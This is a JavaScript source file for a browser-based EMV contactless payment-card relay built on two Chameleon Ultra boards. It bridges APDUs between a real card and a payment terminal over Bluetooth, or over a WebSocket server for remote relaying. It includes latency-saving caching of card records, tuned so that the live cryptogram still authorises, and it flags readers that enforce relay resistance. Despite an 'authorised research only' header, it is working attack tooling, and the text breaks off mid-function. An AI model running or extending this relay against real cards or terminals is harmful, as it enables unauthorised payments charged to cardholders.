/*
 * relay.js -- Web Bluetooth ISO14443-4 (EMV) relay bridge for two Chameleon Ultras.
 *
 * LAB / AUTHORISED-RESEARCH USE ONLY. Relay only cards you own, against
 * terminals you own or are authorised to test.
 *
 * One browser connects to BOTH Ultras over BLE (Nordic UART Service) and
 * bridges APDUs between them -- a direct port of software/script/relay_poc.py,
 * with the TCP hop replaced by two in-browser BLE GATT connections:
 *
 *     [real card] <-RF-> MOLE (board2, reader)  ==BLE==\
 *                                                        >== this browser bridges
 *     [terminal/phone] <-RF-> GHOST (board1, tag) ==BLE=/
 *
 * Requires the relay firmware on both boards (app_version 99.x) and a
 * Web Bluetooth browser (desktop/Android Chrome or Edge; NOT iOS Safari).
 * BLE pairing is disabled on the Ultra by default, so no passkey is needed.
 */
'use strict';

const BUILD = '20260909 stable-fsc256';   // shown in the log so you can confirm which version loaded

// --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
const NUS_RX      = '6e400002-b5a3-f393-e0a9-e50e24dcca9e'; // write  (host -> device)
const NUS_TX      = '6e400003-b5a3-f393-e0a9-e50e24dcca9e'; // notify (device -> host)

const SOF = 0x11;

// --- command IDs (chameleon_enum.py) -----------------------------------------
const CMD = {
  GET_APP_VERSION: 1000,
  CHANGE_DEVICE_MODE: 1001,
  SET_ACTIVE_SLOT: 1003,
  SET_SLOT_TAG_TYPE: 1004,
  SET_SLOT_DATA_DEFAULT: 1005,     // factory-init a slot's tag data: [slot][type BE]
  SET_SLOT_ENABLE: 1006,
  SET_SLOT_TAG_NICK: 1007,        // name a slot (persisted): [slot][sense][name bytes]
  SLOT_DATA_CONFIG_SAVE: 1009,    // commit active slot's data+config to flash (empty payload)
  GET_GIT_VERSION: 1017,
  GET_BATTERY_INFO: 1025,   // -> [voltage_mV(2 BE)][percent(1)]
  HF14A_4_APDU_RECV: 6000,
  HF14A_4_APDU_SEND: 6001,
  HF14A_4_SET_ANTI_COLL: 6002,
  HF14A_4_STATIC_RESP: 6003,      // add/clear static APDU response pairs (cmd_len 0 = clear)
  HF14A_4_RELAY_START: 6006,
  HF14A_4_RELAY_APDU: 6007,
  HF14A_4_RELAY_STOP: 6008,
  HF14A_4_RX_LOG: 6009,           // diagnostic: raw reader frames the ghost received
  HF14A_4_CONN_PARAMS: 6013,      // diagnostic: negotiated BLE conn params (relay latency)
  HF14A_4_SET_LED: 6010,
  HF14A_4_CARD_PROBE: 6011,
  HF14A_4_APDU_SEND_RECV: 6012,   // send response AND block for next APDU (grouped)
  HF14A_4_RELAY_LOG: 6014,        // mole: relayed APDU + card response log (full trace)
  HF14A_4_TX_LOG: 6016,           // ghost: emulator TX frames (ghost->reader) for full trace
  GET_BLE_RSSI: 6017,             // link RSSI (dBm, signed byte; 0 = n/a) of the connected central
  HF14A_SNIFF: 2020,              // passive HF-14A sniff (reader->card frames)
};
// status codes: HF_TAG_OK=0, HF_TAG_NO=1, STATUS_SUCCESS=104 (apdu_recv uses SUCCESS)
const ST = { HF_TAG_OK: 0, HF_TAG_NO: 1, SUCCESS: 104 };
const TAG_HF14A_4 = 3000; // TagSpecificType.HF14A_4
const SENSE_HF = 2;       // TagSenseType.HF
// PPSE (SELECT 2PAY.SYS.DDF01) = start of a new phone transaction
const PPSE_HEAD = hexToBytes('00A404000E325041592E5359532E44444630');

// --- byte helpers ------------------------------------------------------------
function u8(arr) { return arr instanceof Uint8Array ? arr : new Uint8Array(arr); }
function concat(...parts) {
  let n = 0; for (const p of parts) n += p.length;
  const out = new Uint8Array(n); let o = 0;
  for (const p of parts) { out.set(p, o); o += p.length; }
  return out;
}
function hex(b) {
  if (!b || !b.length) return '(empty)';
  return Array.from(b, x => x.toString(16).padStart(2, '0')).join(' ').toUpperCase();
}
function hxc(b) {  // compact hex (no spaces) for the wire
  return Array.from(b, x => x.toString(16).padStart(2, '0')).join('');
}
function hexToBytes(s) {
  s = s.replace(/\s+/g, '');
  const out = new Uint8Array(s.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(s.substr(i * 2, 2), 16);
  return out;
}
function lrc(slice) {
  let r = 0; for (const b of slice) { r = (r + b) & 0xff; }
  return (0x100 - r) & 0xff;
}
function startsWith(a, b) {
  if (a.length < b.length) return false;
  for (let i = 0; i < b.length; i++) if (a[i] !== b[i]) return false;
  return true;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// build a Chameleon command frame (matches make_data_frame_bytes)
function makeFrame(cmd, data, status = 0) {
  data = data || new Uint8Array(0);
  const len = data.length;
  const f = new Uint8Array(9 + len + 1);
  f[0] = SOF;
  f[1] = 0x00;                 // lrc1 slot
  f[2] = (cmd >> 8) & 0xff; f[3] = cmd & 0xff;
  f[4] = (status >> 8) & 0xff; f[5] = status & 0xff;
  f[6] = (len >> 8) & 0xff; f[7] = len & 0xff;
  f[8] = 0x00;                 // lrc2 slot
  f.set(data, 9);
  f[9 + len] = 0x00;           // lrc3 slot
  f[1] = lrc(f.subarray(0, 1));
  f[8] = lrc(f.subarray(0, 8));
  f[9 + len] = lrc(f.subarray(0, 9 + len));
  return f;
}

function parseAntiColl(d) {
  let o = 0;
  const ul = d[o++]; const uid = d.slice(o, o + ul); o += ul;
  const atqa = d.slice(o, o + 2); o += 2;
  const sak = d[o++];
  const al = d[o++]; const ats = d.slice(o, o + al); o += al;
  return { uid, atqa, sak, ats };
}

// --- EMV TLV helpers (for the optional static cache) -------------------------
// Collect the value bytes of every occurrence of `tag` (1- or 2-byte), recursing
// into constructed templates. Minimal, tolerant walker (card-controlled input).
function tlvFind(buf, tag) {
  const out = [];
  (function walk(b) {
    let i = 0;
    while (i < b.length) {
      const first = b[i];
      if (first === 0x00 || first === 0xff) { i++; continue; }
      let t = first, tl = 1;
      if ((first & 0x1f) === 0x1f) { if (i + 1 >= b.length) break; t = (b[i] << 8) | b[i + 1]; tl = 2; }
      i += tl; if (i >= b.length) break;
      let ln = b[i++];
      if (ln & 0x80) { let nb = ln & 0x7f; ln = 0; while (nb-- > 0 && i < b.length) ln = (ln << 8) | b[i++]; }
      const val = b.slice(i, i + ln); i += ln;
      if (t === tag) out.push(val);
      if (first & 0x20) walk(val);   // constructed
    }
  })(buf);
  return out;
}
function parseAids(fci) { return tlvFind(fci, 0x4f); }
function parseAfl(gpo) {
  let afl = new Uint8Array(0);
  const a = tlvFind(gpo, 0x94);
  if (a.length) afl = a[0];
  else { const t = tlvFind(gpo, 0x80); if (t.length && t[0].length > 2) afl = t[0].slice(2); }
  const out = [];
  for (let i = 0; i + 3 < afl.length; i += 4) out.push({ sfi: afl[i] >> 3, r1: afl[i + 1], r2: afl[i + 2] });
  return out;
}
function sw9000(r) { return r && r.length >= 2 && r[r.length - 2] === 0x90 && r[r.length - 1] === 0x00; }

// Pre-read the card's STATIC EMV flow over the mole session and return cmd->resp
// pairs to load into the ghost. Relays are live (M.relayApdu); the returned pairs
// are what the ghost then serves instantly.
//
// PAYMENT-SAFE HYBRID: we traverse SELECT and GPO (to reach the records) but DO
// NOT cache them — they are STATE-CRITICAL. At a real POS the terminal's GPO
// carries real data and the card computes session state from it; serving a cached
// SELECT/GPO would leave the card out of sync so the live GENERATE AC fails (6D00/
// 6985). So SELECT + GPO + GENERATE AC fall through to LIVE relay every tap; only
// the truly-static, non-state-advancing reads (PPSE, READ RECORD, GET DATA) are
// cached. (Verified on-card by the cache-safety test: records cacheable, GPO not.)
async function buildStaticCache(M) {
  const pairs = [];
  const PPSE = hexToBytes('00A404000E325041592E5359532E444446303100');
  const rly = async (apdu) => { try { const r = await M.relayApdu(apdu); return r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
  const fci = await rly(PPSE);
  if (!(fci.length > 2)) { log('cache: PPSE relay failed — skipping cache', 'warn'); return pairs; }
  pairs.push({ cmd: PPSE, resp: fci });   // PPSE = static directory, safe to cache
  // dedupe AIDs (a PPSE can list the same AID twice) so we don't waste cache slots
  const seenAid = new Set();
  const aids = parseAids(fci).filter(a => { const h = hxc(a); if (seenAid.has(h)) return false; seenAid.add(h); return true; });
  log(`cache: PPSE ${fci.length}B, AIDs ${aids.map(a => hxc(a)).join(', ')}`);
  for (const aid of aids) {
    const sel = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
    const sr = await rly(sel);
    if (!sw9000(sr)) { log(`cache: SELECT ${hxc(aid)} -> skip`, 'warn'); continue; }
    // NOT cached: SELECT is state-critical (the card must actually receive it live).
    const gpo = hexToBytes('80A8000002830000');
    const gr = await rly(gpo);
    if (sw9000(gr)) {
      // NOT cached: GPO is state-critical + dynamic at a real POS. We only relay it
      // here to read the AFL so we know which records to cache.
      // Cache only the records the AFL actually lists (r1..r2) and only the ones
      // that succeed — the old r2+1 over-read just fetched a guaranteed 6a83.
      for (const { sfi, r1, r2 } of parseAfl(gr)) {
        for (let rec = r1; rec <= r2; rec++) {
          const rr = u8([0x00, 0xb2, rec, (sfi << 3) | 0x04, 0x00]);
          const rd = await rly(rr);
          if (sw9000(rd)) pairs.push({ cmd: rr, resp: rd });
        }
      }
    }
    // GET DATA is NOT cached: some tags are dynamic (9F36 ATC increments every
    // transaction, 9F17 PIN-try counter), so a cached value would go stale — the
    // same hazard as caching GPO. They fall through to live relay per tap.
  }
  log(`cache: built ${pairs.length} static pairs (PPSE + records)`, 'ok');
  return pairs;
}

// --- BLE device wrapper ------------------------------------------------------
class ChameleonBLE {
  constructor(label) {
    this.label = label;
    this.device = null; this.rx = null; this.tx = null;
    this.buf = new Uint8Array(0);
    this.waiters = new Map();   // cmd -> [waiter]
    // Optimistic BLE write chunk. Chrome+nRF52 almost always negotiate an MTU
    // >=185 regardless of link speed, so big frames go in 1-2 writes instead of
    // ~13. Auto-falls back to 20 (today's behaviour) if a device negotiated the
    // 23-byte minimum MTU — see _write.
    this.mtu = 244;
    this.onDisconnect = null;
  }

  get connected() { return !!(this.device && this.device.gatt && this.device.gatt.connected); }

  async connect() {
    this.device = await navigator.bluetooth.requestDevice({
      filters: [{ namePrefix: 'Chameleon' }],
      optionalServices: [NUS_SERVICE],
    });
    this.device.addEventListener('gattserverdisconnected', () => {
      if (this.onDisconnect) this.onDisconnect();
    });
    const server = await this.device.gatt.connect();
    const svc = await server.getPrimaryService(NUS_SERVICE);
    this.rx = await svc.getCharacteristic(NUS_RX);
    this.tx = await svc.getCharacteristic(NUS_TX);
    await this.tx.startNotifications();
    this.tx.addEventListener('characteristicvaluechanged', e => this._onNotify(e.target.value));
    // handshake: prove it speaks our protocol / relay firmware
    const v = await this.sendCmd(CMD.GET_APP_VERSION);
    this.fw = v.data.length >= 2 ? `${v.data[0]}.${v.data[1]}` : '?';
    try {
      const g = await this.sendCmd(CMD.GET_GIT_VERSION);
      this.git = new TextDecoder().decode(g.data);
    } catch (_) { this.git = ''; }
    await this.readBattery();
    await this.readRssi();
    return this;
  }

  // Battery level (voltage + percent). Best-effort; safe to call any time the board
  // is idle (don't call during a relay/test — the active loop monopolises BLE).
  async readBattery() {
    try {
      const b = await this.sendCmd(CMD.GET_BATTERY_INFO, new Uint8Array(0), 2000);
      if (b.data && b.data.length >= 3) {
        this.battMv = (b.data[0] << 8) | b.data[1];
        this.battPct = b.data[2];
      }
    } catch (_) {}
    return this.battPct;
  }
  // Link RSSI (dBm) of this BLE connection, as measured by the board. 0 = n/a.
  async readRssi() {
    try {
      const r = await this.sendCmd(CMD.GET_BLE_RSSI, new Uint8Array(0), 2000);
      if (r.data && r.data.length >= 1) { const v = r.data[0]; this.rssi = v > 127 ? v - 256 : v; }
    } catch (_) {}
    return this.rssi;
  }

  async disconnect() {
    try { if (this.device && this.device.gatt.connected) this.device.gatt.disconnect(); } catch (_) {}
  }

  _onNotify(dv) {
    const chunk = new Uint8Array(dv.buffer, dv.byteOffset, dv.byteLength);
    this.buf = concat(this.buf, chunk);
    this._parse();
  }

  _parse() {
    for (;;) {
      if (this.buf.length < 2) return;
      if (this.buf[0] !== SOF || this.buf[1] !== lrc(this.buf.subarray(0, 1))) {
        this.buf = this.buf.subarray(1); continue;
      }
      if (this.buf.length < 9) return;
      if (this.buf[8] !== lrc(this.buf.subarray(0, 8))) { this.buf = this.buf.subarray(1); continue; }
      const cmd = (this.buf[2] << 8) | this.buf[3];
      const status = (this.buf[4] << 8) | this.buf[5];
      const len = (this.buf[6] << 8) | this.buf[7];
      const total = 9 + len + 1;
      if (this.buf.length < total) return;
      if (this.buf[9 + len] !== lrc(this.buf.subarray(0, 9 + len))) { this.buf = this.buf.subarray(1); continue; }
      const data = this.buf.slice(9, 9 + len);
      this.buf = this.buf.slice(total);
      this._deliver({ cmd, status, data });
    }
  }

  _deliver(resp) {
    const q = this.waiters.get(resp.cmd);
    if (!q) return;
    while (q.length) {
      const w = q.shift();
      if (!w.done) { w.done = true; clearTimeout(w.to); w.resolve(resp); return; }
    }
  }

  sendCmd(cmd, data, timeoutMs = 4000) {
    const frame = makeFrame(cmd, data);
    if (!this.waiters.has(cmd)) this.waiters.set(cmd, []);
    const q = this.waiters.get(cmd);
    const p = new Promise((resolve, reject) => {
      const w = { done: false, resolve, to: null };
      w.to = setTimeout(() => {
        w.done = true;
        const i = q.indexOf(w); if (i >= 0) q.splice(i, 1);
        reject(new Error(`${this.label}: timeout waiting for cmd ${cmd}`));
      }, timeoutMs);
      q.push(w);
    });
    this._write(frame).catch(() => {});
    return p;
  }

  // Serialize all writes to this device: Web Bluetooth allows only one writeValue
  // in flight per characteristic, so concurrent sendCmd calls (e.g. the relay loop
  // + a Clear-cache click) otherwise collide ("GATT operation already in progress")
  // and time out. Chain every write so they go out one at a time.
  _write(frame) {
    this._writeChain = (this._writeChain || Promise.resolve())
      .catch(() => {})
      .then(() => this._writeRaw(frame));
    return this._writeChain;
  }

  async _writeRaw(frame) {
    for (;;) {
      let sent = 0;
      try {
        for (let i = 0; i < frame.length; i += this.mtu) {
          const chunk = frame.subarray(i, Math.min(i + this.mtu, frame.length));
          if (this.rx.writeValueWithoutResponse) await this.rx.writeValueWithoutResponse(chunk);
          else await this.rx.writeValue(chunk);
          sent = i + chunk.length;
        }
        return;
      } catch (e) {
        // Only shrink+retry if NOTHING was sent yet (an oversized first chunk on
        // a tiny-MTU device rejects before transmitting) — so no duplicate/garbled
        // bytes reach the device. A mid-frame failure is not an MTU issue: rethrow.
        if (sent === 0 && this.mtu > 20) { this.mtu = 20; continue; }
        throw e;
      }
    }
  }

  // --- high-level wrappers (mirror chameleon_cmd.py) -------------------------
  changeMode(reader) { return this.sendCmd(CMD.CHANGE_DEVICE_MODE, u8([reader ? 1 : 0])); }
  setActiveSlot(slot) { return this.sendCmd(CMD.SET_ACTIVE_SLOT, u8([slot - 1])); }
  setSlotTagType(slot, t) { return this.sendCmd(CMD.SET_SLOT_TAG_TYPE, u8([slot - 1, (t >> 8) & 0xff, t & 0xff])); }
  // Factory-init a slot's tag data so its flash record is valid before we write
  // anti-coll + static responses into it (a fresh slot has no valid HF14A_4
  // record; without this the persisted slot won't emulate standalone).
  setSlotDataDefault(slot, t) { return this.sendCmd(CMD.SET_SLOT_DATA_DEFAULT, u8([slot - 1, (t >> 8) & 0xff, t & 0xff]), 4000); }
  setSlotEnable(slot, sense, en) { return this.sendCmd(CMD.SET_SLOT_ENABLE, u8([slot - 1, sense, en ? 1 : 0])); }
  setAntiColl(a) {
    const p = concat(u8([a.uid.length]), a.uid, a.atqa, u8([a.sak]), u8([a.ats.length]), a.ats);
    return this.sendCmd(CMD.HF14A_4_SET_ANTI_COLL, p);
  }
  // Persist the active slot's data+config (incl. the flash-backed static-response
  // table just loaded) to flash, so it survives a reboot and is usable standalone.
  saveSlotToFlash() { return this.sendCmd(CMD.SLOT_DATA_CONFIG_SAVE, new Uint8Array(0), 6000); }
  // Name a slot (persisted). name is truncated to 32 bytes.
  setSlotNick(slot, sense, name) {
    const nb = new TextEncoder().encode(name).slice(0, 32);
    return this.sendCmd(CMD.SET_SLOT_TAG_NICK, concat(u8([slot - 1, sense]), nb));
  }
  // Clear any static (cached) APDU responses on the active slot. The web app never
  // sets them, but they are flash-backed and persist, so a stray cache (e.g. from a
  // debug tool) would make the ghost answer from cache instead of relaying live.
  clearStaticResponses() { return this.sendCmd(CMD.HF14A_4_STATIC_RESP, u8([0]), 3000); }
  // Lightweight activity read: the RX ring buffer's frame counter (first byte of
  // the RX_LOG response). Increases on every RF frame the ghost receives from a
  // reader — so it climbs even when a tap is served entirely from cache (in-ISR)
  // and never reaches the host. Used to show cached-tap feedback in the portal.
  async rxCount() {
    try { const r = await this.sendCmd(CMD.HF14A_4_RX_LOG, u8([0]), 2000); return r.data.length ? r.data[0] : -1; }
    catch (_) { return -1; }
  }
  // Cumulative count of APDUs the ghost served from its static cache (in-ISR),
  // in the trailing 4 bytes (LE) of the RX_LOG response. Lets the portal show
  // cache-served vs relayed per tap. -1 if unavailable (old fw / short response).
  async hitCount() {
    try {
      const r = await this.sendCmd(CMD.HF14A_4_RX_LOG, u8([0]), 2000);
      const d = r.data; if (!d || d.length < 4) return -1;
      const o = d.length - 4;
      return d[o] | (d[o + 1] << 8) | (d[o + 2] << 16) | (d[o + 3] << 24);
    } catch (_) { return -1; }
  }
  // Load one cached cmd->resp pair: cmd_len(1) cmd(n) resp_len_be16(2) resp(m).
  addStaticResponse(cmd, resp) {
    const p = concat(u8([cmd.length]), cmd, u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp);
    return this.sendCmd(CMD.HF14A_4_STATIC_RESP, p);
  }
  // Load MANY pairs in as few commands as possible: the firmware parses multiple
  // concatenated pairs from one frame, so this replaces N per-pair round-trips
  // with ~1 (chunked to stay well under the 4 KB frame cap). Returns pairs loaded.
  async addStaticResponseBatch(pairs) {
    const MAX = 3000;   // bytes per frame, safely under NETDATA_MAX_DATA_LENGTH
    let loaded = 0, chunk = [], size = 0;
    const flush = async () => {
      if (!chunk.length) return;
      await this.sendCmd(CMD.HF14A_4_STATIC_RESP, concat(...chunk), 3000);
      loaded += chunk.length; chunk = []; size = 0;
    };
    for (const p of pairs) {
      const enc = concat(u8([p.cmd.length]), p.cmd, u8([(p.resp.length >> 8) & 0xff, p.resp.length & 0xff]), p.resp);
      if (size + enc.length > MAX) await flush();
      chunk.push(enc); size += enc.length;
    }
    await flush();
    return loaded;
  }
  // Passive HF-14A sniff: block on-device for `timeoutMs` capturing reader->card
  // frames (passive=1 => stay silent, don't respond). Returns the trace buffer.
  sniff(timeoutMs, passive) {
    const t = Math.min(Math.max(timeoutMs | 0, 1000), 30000);
    return this.sendCmd(CMD.HF14A_SNIFF, u8([(t >> 8) & 0xff, t & 0xff, passive ? 1 : 0]), t + 3000);
  }
  apduRecv() { return this.sendCmd(CMD.HF14A_4_APDU_RECV, new Uint8Array(0), 2500); }
  apduSend(resp) { return this.sendCmd(CMD.HF14A_4_APDU_SEND, concat(u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp)); }
  // Grouped: deliver `resp` (may be empty = pure blocking recv) AND wait on-device
  // for the phone's next APDU, returned in the same round-trip. Kills the poll gap.
  // waitMs (optional) = firmware on-device block timeout; the host RTT allowance
  // is set above it so the BLE call never times out before the device returns.
  apduSendRecv(resp, waitMs) {
    let p = concat(u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp);
    if (waitMs) p = concat(p, u8([(waitMs >> 8) & 0xff, waitMs & 0xff]));
    return this.sendCmd(CMD.HF14A_4_APDU_SEND_RECV, p, (waitMs || 600) + 1500);
  }
  async relayStart() {
    const r = await this.sendCmd(CMD.HF14A_4_RELAY_START, new Uint8Array(0), 3500);
    if (r.status === ST.HF_TAG_OK && r.data.length) r.parsed = parseAntiColl(r.data);
    return r;
  }
  relayApdu(apdu) { return this.sendCmd(CMD.HF14A_4_RELAY_APDU, apdu, 3500); }
  relayStop() { return this.sendCmd(CMD.HF14A_4_RELAY_STOP, new Uint8Array(0), 2500); }
  // Negotiated BLE connection params (relay-latency diagnostic). Returns ms, or
  // null if unsupported (older firmware) / never connected. interval is what
  // gates per-APDU latency; the central (browser/OS) chooses it, not us.
  async connParams() {
    try {
      const r = await this.sendCmd(CMD.HF14A_4_CONN_PARAMS, new Uint8Array(0), 2000);
      if (!r.data || r.data.length < 8) return null;
      const be = (i) => (r.data[i] << 8) | r.data[i + 1];
      const mx = be(2);
      if (!mx) return null;                    // 0 = never connected
      return { minMs: be(0) * 1.25, maxMs: mx * 1.25, latency: be(4), timeoutMs: be(6) * 10 };
    } catch (_) { return null; }               // command unknown on old firmware
  }
  cardProbe(force) { return this.sendCmd(CMD.HF14A_4_CARD_PROBE, u8([force ? 1 : 0]), 2500); }
  setLed(state) { return this.sendCmd(CMD.HF14A_4_SET_LED, u8([state & 0xff])); }
}

// ---------------------------------------------------------------------------
// Phase 2: WebSocket rendezvous link + remote-mole proxy
// ---------------------------------------------------------------------------
// The ghost phone talks to the remote mole phone through a room on the relay
// server. WSMole gives the ghost-side loop the same method surface as a local
// mole board, so the loop code is identical whether the mole is local or remote.
class WSLink {
  constructor() {
    this.ws = null; this.waiters = new Map(); this.onReq = null; this.onPeers = null;
    this.onClose = null; this.peers = 0; this.roles = [];
    this.hb = null;   // heartbeat interval
    this.mole = new WSMole(this);
  }
  _startHb() { this._stopHb(); this.hb = setInterval(() => this.send({ t: 'ping' }), 30000); }
  _stopHb() { if (this.hb) { clearInterval(this.hb); this.hb = null; } }
  get connected() { return !!(this.ws && this.ws.readyState === 1); }
  connect(url, room, role) {
    return new Promise((resolve, reject) => {
      let ws;
      try { ws = new WebSocket(url); } catch (e) { reject(e); return; }
      this.ws = ws;
      const to = setTimeout(() => { try { ws.close(); } catch (_) {} reject(new Error('link connect timeout')); }, 8000);
      ws.onopen = () => ws.send(JSON.stringify({ t: 'join', room, role }));
      ws.onmessage = (ev) => {
        let m; try { m = JSON.parse(ev.data); } catch { return; }
        if (m.t === 'joined') { clearTimeout(to); this.peers = m.n; this.roles = m.roles || []; this._startHb(); resolve(m); return; }
        if (m.t === 'error') { clearTimeout(to); reject(new Error('link: ' + m.reason)); return; }
        if (m.t === 'pong') return;   // heartbeat ack
        if (m.t === 'peers') { this.peers = m.n; this.roles = m.roles || []; if (this.onPeers) this.onPeers(m); return; }
        const q = this.waiters.get(m.t);
        if (q && q.length) { const w = q.shift(); clearTimeout(w.to); w.resolve(m); return; }
        if (this.onReq) this.onReq(m);   // inbound request for the mole-serve handler
      };
      ws.onerror = () => {};
      ws.onclose = () => { this._stopHb(); this.ws = null; if (this.onClose) this.onClose(); };
    });
  }
  send(obj) { if (this.connected) this.ws.send(JSON.stringify(obj)); }
  request(obj, respType, timeoutMs = 6000) {
    return new Promise((resolve, reject) => {
      if (!this.waiters.has(respType)) this.waiters.set(respType, []);
      const q = this.waiters.get(respType);
      const w = { resolve, to: setTimeout(() => { const i = q.indexOf(w); if (i >= 0) q.splice(i, 1); reject(new Error('link timeout ' + respType)); }, timeoutMs) };
      q.push(w);
      this.send(obj);
    });
  }
  close() { this._stopHb(); try { this.ws && this.ws.close(); } catch (_) {} this.ws = null; }
}

// Ghost-side view of the remote mole: same surface as a ChameleonBLE mole so the
// relay loop is transport-agnostic. changeMode/setLed are no-ops (the mole phone
// inits its own board and drives its own LED).
class WSMole {
  constructor(link) { this.link = link; }
  async changeMode() { return { status: 0 }; }
  async setLed() { return { status: 0 }; }
  async cardProbe(force) {
    const r = await this.link.request({ t: 'stat', force: !!force }, 'stat_res', 4000);
    return { status: r.present ? ST.HF_TAG_OK : ST.HF_TAG_NO };
  }
  async relayStart() {
    const r = await this.link.request({ t: 'scan' }, 'scan_res', 6000);
    if (r.uid) return { status: ST.HF_TAG_OK, parsed: { uid: hexToBytes(r.uid), atqa: hexToBytes(r.atqa), sak: r.sak, ats: hexToBytes(r.ats) } };
    return { status: ST.HF_TAG_NO };
  }
  async relayApdu(apdu) {
    const r = await this.link.request({ t: 'apdu', apdu: hxc(apdu) }, 'apdu_res', 6000);
    return { status: r.st, data: hexToBytes(r.data || '') };
  }
  async relayStop() { this.link.send({ t: 'stop' }); return { status: 0 }; }
}

// ---------------------------------------------------------------------------
// UI wiring + relay orchestration
// ---------------------------------------------------------------------------
const ghost = new ChameleonBLE('ghost');   // board1, at the terminal/phone
const mole  = new ChameleonBLE('mole');    // board2, at the card
const wsLink = new WSLink();
const currentRole = () => (document.querySelector('input[name=role]:checked') || {}).value || 'local';

// Screen wake lock: keep the screen on + tab foreground while relaying/serving.
// A web page can't run in the background (Chrome suspends it); this stops the
// phone dimming/locking, which is what suspends the loop and drops the link.
let wakeLock = null;
async function acquireWakeLock() {
  try { if ('wakeLock' in navigator && !wakeLock) { wakeLock = await navigator.wakeLock.request('screen'); wakeLock.addEventListener('release', () => { wakeLock = null; }); log('screen wake lock on (keep this tab foreground)', 'ok'); } }
  catch (_) { log('wake lock unavailable — keep the screen on manually', 'warn'); }
}
function releaseWakeLock() { try { if (wakeLock) { wakeLock.release(); wakeLock = null; } } catch (_) {} }
document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible' && running && !wakeLock) acquireWakeLock(); });
let running = false;
let apduCount = 0;
let rrpSeenThisRun = false;              // did the terminal send 80 EA (RRP) this session?
let rrpResolved = false;                 // badge settled to a verdict live (past GPO, no 80 EA)
let curPdol = null, curCdol1 = null;    // this card's DOL layouts (from SELECT / READ RECORD)
let curTermData = {};                    // terminal tags captured from GPO/GENERATE AC this run
let recognisedThisRun = false;           // logged a store match already this run?
let cacheCount = 0;                      // static entries currently in the ghost (host's view)
const cachedCmds = new Set();           // hex of cmds cached this session (dedupe on pre-fill load)
let clearRequested = false;             // Clear-cache asked while the relay loop is running

const $ = id => document.getElementById(id);

function setCacheStatus(note) {
  const el = $('cache-status'); if (!el) return;
  el.textContent = cacheCount > 0 ? `cache: ${cacheCount} cached${note ? ' (' + note + ')' : ''}` : 'cache: empty';
  el.style.color = cacheCount > 0 ? 'var(--green)' : 'var(--muted)';
}
function cacheReset() { cacheCount = 0; cachedCmds.clear(); setCacheStatus(); }

// Prominent RRP badge so a reader's relay-resistance is visible without scrolling.
function setRrpBadge(state) {
  const el = $('rrp-badge'); if (!el) return;
  if (state === 'enforced') { el.textContent = '⚠ READER ENFORCES RRP'; el.style.display = ''; el.style.background = '#5a1a1a'; el.style.color = '#ff9a9a'; }
  else if (state === 'watch') { el.textContent = 'RRP: watching…'; el.style.display = ''; el.style.background = '#23272f'; el.style.color = '#9aa2ad'; }
  else if (state === 'clear') { el.textContent = '✓ no RRP seen'; el.style.display = ''; el.style.background = '#153015'; el.style.color = '#8fe08f'; }
  else { el.style.display = 'none'; }
}

function log(msg, cls) {
  const el = $('log');
  const line = document.createElement('div');
  if (cls) line.className = cls;
  const t = new Date().toLocaleTimeString();
  line.textContent = `[${t}] ${msg}`;
  el.appendChild(line);
  el.scrollTop = el.scrollHeight;
}

function setLedUI(who, color) {
  const dot = $(who + '-led');
  if (dot) dot.dataset.color = color;
}

// Transaction progress stepper: lights up PPSE -> SELECT AID -> GPO -> READ
// RECORD -> GENERATE AC as each command class is relayed during a tap.
// Reaching GENERATE AC = the terminal accepted the card and is authorising, so
// the whole bar goes green there. Reset per tap.
const TX_STEP_COUNT = 5;
function txStepShow(on) { const b = $('txsteps'); if (b) b.hidden = !on; }
function txStepReset() {
  const b = $('txsteps'); if (!b) return;
  b.hidden = false;
  [...b.children].forEach(el => { el.className = 'txstep'; });
}
function txStepMark(idx) {   // idx active; all before it done; GENERATE AC (last) = all done
  const b = $('txsteps'); if (!b || idx < 0) return;
  b.hidden = false;
  const last = idx === TX_STEP_COUNT - 1;
  [...b.children].forEach((el, i) => {
    const done = i < idx || last;
    el.className = 'txstep' + (done ? ' done' : i === idx ? ' active' : '');
  });
}
function txStepFor(apdu) {   // map a reader APDU to a step index, or -1
  if (!apdu || apdu.length < 2) return -1;
  const a0 = apdu[0], a1 = apdu[1];
  if (a0 === 0x00 && a1 === 0xA4)             // SELECT: PPSE if the name field starts 32 50 ("2P")
    return (apdu.length > 6 && apdu[5] === 0x32 && apdu[6] === 0x50) ? 0 : 1;
  if (a0 === 0x80 && a1 === 0xA8) return 2;   // GPO
  if (a0 === 0x00 && a1 === 0xB2) return 3;   // READ RECORD
  if (a0 === 0x80 && a1 === 0xAE) return 4;   // GENERATE AC
  return -1;
}

function setDevUI(who, dev) {
  const el = $(who + '-status');
  if (!dev.connected) { el.textContent = 'not connected'; }
  else {
    let s = `connected  fw ${esc(dev.fw)}${dev.git ? '  git ' + esc(dev.git) : ''}`;
    if (dev.battPct != null) {
      const low = dev.battPct <= 20;
      const v = dev.battMv ? ` (${(dev.battMv / 1000).toFixed(2)}V)` : '';
      s += `  <span style="color:${low ? 'var(--red)' : 'var(--muted)'};font-weight:${low ? 700 : 400}">🔋 ${dev.battPct}%${v}${low ? ' LOW' : ''}</span>`;
    }
    if (dev.rssi) {   // dBm, negative; closer to 0 = stronger. weak (< -80) shown amber
      const weak = dev.rssi < -80;
      s += `  <span style="color:${weak ? 'var(--amber)' : 'var(--muted)'}">📶 ${dev.rssi} dBm${weak ? ' weak' : ''}</span>`;
    }
    el.innerHTML = s;
  }
  $(who + '-btn').textContent = dev.connected ? 'Disconnect' : 'Connect';
  $(who + '-card').classList.toggle('on', dev.connected);
  updateStartEnabled();
}

function updateStartEnabled() {
  const role = currentRole();
  let ready;
  if (role === 'local')      ready = ghost.connected && mole.connected;
  else if (role === 'ghost') ready = ghost.connected && wsLink.connected;
  else                       ready = mole.connected && wsLink.connected;   // mole
  $('start').disabled = !(ready && !running);
  $('stop').disabled = !running;
  $('start').textContent = role === 'mole' ? 'Start serving' : 'Start relay';
